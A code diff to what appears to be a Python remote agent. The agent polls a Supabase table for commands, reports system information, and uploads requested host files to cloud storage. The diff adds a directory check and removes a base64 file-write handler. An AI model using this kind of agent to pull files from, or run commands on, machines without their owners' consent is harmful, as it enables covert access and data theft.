@@ -113,6 +113,9 @@ def handle_download_command(command_text, username):
         if not os.path.exists(file_path):
             return "Failed", f"File does not exist: {file_path}"
 
+        if os.path.isdir(file_path):
+            return "Failed", f"Invalid path, it is a directory: {file_path}"
+
         mimetype, _ = mimetypes.guess_type(file_path)
         mimetype = mimetype if mimetype else "application/octet-stream"
         file_name = os.path.basename(file_path)
@@ -144,7 +147,7 @@ def handle_download_command(command_text, username):
             return "Failed", f"Upload failed: {error_message}"
 
     except Exception as e:
-        return "Failed", str(e)
+        return "Failed", f"An unexpected error occurred: {str(e)}"
 
 def get_public_url(bucket_name, file_path):
     """Constructs the public URL for a file in Supabase storage."""
@@ -172,18 +175,6 @@ def download_from_supabase(file_url, remote_path, supabase_key):
 def fetch_pending_uploads():
     """Fetches pending uploads from the 'uploads' table."""
     return supabase.table("uploads").select("*").eq("status", "pending").execute()
-
-
-def handle_upload_command(command_text, encoded_data, username):
-    """Handle the 'upload' command by decoding and writing the file to the specified path."""
-    try:
-        _, remote_path = command_text.split(maxsplit=2)[1:]
-        file_data = base64.b64decode(encoded_data)
-        with open(remote_path, 'wb') as f:
-            f.write(file_data)
-        return 'Completed', f"File uploaded to '{remote_path}'"
-    except Exception as e:
-        return 'Failed', str(e)
 
 def execute_commands():
     hostname, ip, os_info = get_system_info()
@@ -283,8 +274,6 @@ def update_settings_status(hostname, status):
             logging.warning(f"Failed to update status for {hostname}. Error details: {response.json()}")  # Log error details
     except Exception as e:
         logging.error(f"An error occurred while updating status for {hostname}: {e}")
-
-
 
 if __name__ == '__main__':
     reset_agent_status()
